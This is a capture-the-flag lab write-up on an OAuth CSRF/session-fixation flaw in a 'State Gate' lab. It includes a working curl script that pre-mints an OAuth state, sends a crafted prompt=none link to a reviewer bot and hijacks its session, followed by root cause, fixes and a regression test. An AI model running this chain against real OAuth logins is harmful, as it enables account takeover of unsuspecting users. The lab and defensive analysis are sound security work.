# Solo Leveling: State Gate — OAuth CSRF via Crafted Google Link

## What Is Happening

The [State Gate lab](https://solo-leveling-2-ea081cffdc8f.pwnbox-lab.com/) uses Google OAuth with **stateless token binding**: a `tk` HttpOnly cookie from `GET /` binds to server-minted OAuth `state` from `GET /init`. A reviewer bot with an active Google IdP session accepts URLs via `POST /report`.

The flag is on `/profile` for identity **Statue of God**, not default user `pwnu`.

Unlike the sibling **Origin Gate (sl3)** lab, `/logger` is removed. No hash exfil or postMessage channel is required.

## Why It Happens

**OAuth CSRF / session fixation:**

1. Attacker preshots `tk` + `state` via `/` and `/init`.
2. Attacker crafts a Google OAuth URL containing that `state` and `prompt=none`.
3. Victim (reviewer bot) visits the URL and completes IdP authorization.
4. Victim is redirected to `/callback?code=...&state=...`. The server **stages the code** for that `state`.
5. Attacker calls `GET /auth` with their saved `tk` — **without ever possessing the authorization code** — and receives the victim's app session.

Root cause: the server does not verify that the browser completing `/callback` is the same browser that initiated the OAuth flow bound to `tk`.

This matches real-world reports where an attacker only needs to craft a Google OAuth link (`accounts.google.com`-style IdP URL) and trick a victim into clicking it.

## Exploit Chain

1. Attacker `GET /` → save `tk` cookie.
2. Attacker `GET /init` → extract `state` from redirect `Location`.
3. Build OAuth URL:

```text
https://google-[instance].pwnbox-lab.com/o/oauth2/v2/auth
  ?client_id=solo-leveling-2-client
  &redirect_uri=https://solo-leveling-2-[instance].pwnbox-lab.com/callback
  &response_type=code
  &scope=openid email profile
  &prompt=none
  &state=<attacker_state>
```

4. `POST /report` with `url=<oauth_url>` (report the OAuth link directly — no wrapper page).
5. Attacker `GET /auth` → `GET /profile` → **Statue of God** + flag.

## Exact Test

```bash
SL='https://solo-leveling-2-[instance].pwnbox-lab.com'
G='https://google-[instance].pwnbox-lab.com'

curl -sS -c /tmp/att.txt "$SL/" -o /dev/null
STATE=$(curl -sS -b /tmp/att.txt "$SL/init" -D - -o /dev/null \
  | grep -i '^location:' | sed 's/.*state=//' | cut -d'&' -f1)

OAUTH="${G}/o/oauth2/v2/auth?client_id=solo-leveling-2-client\
&redirect_uri=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${SL}/callback'))")\
&response_type=code&scope=openid%20email%20profile&prompt=none&state=${STATE}"

curl -sS -b /tmp/att.txt -X POST "$SL/report" --data-urlencode "url=${OAUTH}"
sleep 5
curl -sS -b /tmp/att.txt "$SL/auth" -L
curl -sS -b /tmp/att.txt "$SL/profile"
```

Expected: profile heading **Statue of God**; `.flag-value` contains `pwnbox{...}`.

## Expected Signal

- After report, attacker `/auth` redirects to `/profile` within seconds.
- Attacker never visited `/callback?code=...` and never exfiltrated a code.
- Simulating victim: sessionless `GET` to callback URL, then attacker-only `GET /auth` → `/profile` still works.

## Root Cause

Cross-browser acceptance of authorization codes for attacker-initiated OAuth `state` bound only to attacker's `tk` cookie, without binding callback completion to the initiating session.

## Impact

- Account takeover of any user who completes attacker-crafted OAuth link while logged into IdP
- In lab: reviewer bot session hijack → privileged profile + flag

## Fix

- Require same browser session on `/callback` and `/init`
- One-time use `state`, PKCE, strict session binding on code exchange
- Reject `/auth` completion when callback IP/User-Agent differs from initiator

## Regression Test

1. Attacker preshot `tk` + `state`.
2. Different browser/session completes OAuth for that `state`.
3. Assert attacker's `/auth` **fails** (401/403/error), not victim profile.

## Report Summary

**Title:** OAuth CSRF via pre-minted state allows account takeover via crafted IdP link

**Severity:** High (matches common H1 downgrades from Critical when victim interaction is a single OAuth click)

**Summary:** Attacker pre-seeds gate session, sends victim a Google OAuth URL with attacker-bound `state`. Victim IdP login completes attacker's pending OAuth flow; attacker hijacks session without stealing authorization code.
